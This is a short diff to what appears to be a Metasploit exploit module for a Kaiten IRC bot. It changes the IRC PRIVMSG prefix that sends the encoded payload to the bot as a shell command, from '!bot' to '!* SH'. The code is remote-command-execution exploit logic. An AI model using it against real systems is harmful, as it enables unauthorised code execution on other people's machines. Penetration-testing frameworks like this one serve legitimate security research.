@@ -125,7 +125,7 @@ class Metasploit3 < Msf::Exploit::Remote
 
   def kaiten_command(sock)
     encoded = payload.encoded
-    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!bot #{encoded}\r\n"
+    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!* SH #{encoded}\r\n"
     send_msg(sock, command_msg)
   end
 
